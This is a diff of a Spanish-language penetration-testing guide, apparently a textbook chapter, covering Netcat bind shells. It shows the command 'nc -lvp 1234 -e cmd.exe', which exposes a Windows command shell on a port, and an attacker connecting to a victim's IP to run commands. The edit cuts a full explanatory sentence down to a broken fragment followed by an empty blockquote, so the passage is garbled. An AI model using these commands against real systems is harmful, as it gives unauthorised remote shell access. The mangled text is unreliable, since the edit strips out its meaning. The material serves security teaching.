@@ -56,7 +56,9 @@ listening on [any] 1234 ...
 
 ```
 
-**NOTA** En los sistemas Windows, puede ejecutar la utilidad del símbolo del sistema cmd.exe con el comando **nc -lvp 1234 -e cmd.exe** Netcat.
+Windows **nc -lvp 1234 -e cmd.exe** Netcat.
+
+>
 
 Como se muestra en el Ejemplo 8-3, en el sistema atacante (192.168.78.147), se utiliza el comando **nc -nv 192.168.78.6 1234 para conectarse con la víctima.** Una vez que el atacante (192.168.78.147) se conecta con la víctima (192.168.78.6), se invoca el comando **ls** y se muestran tres archivos en la pantalla del atacante.
 
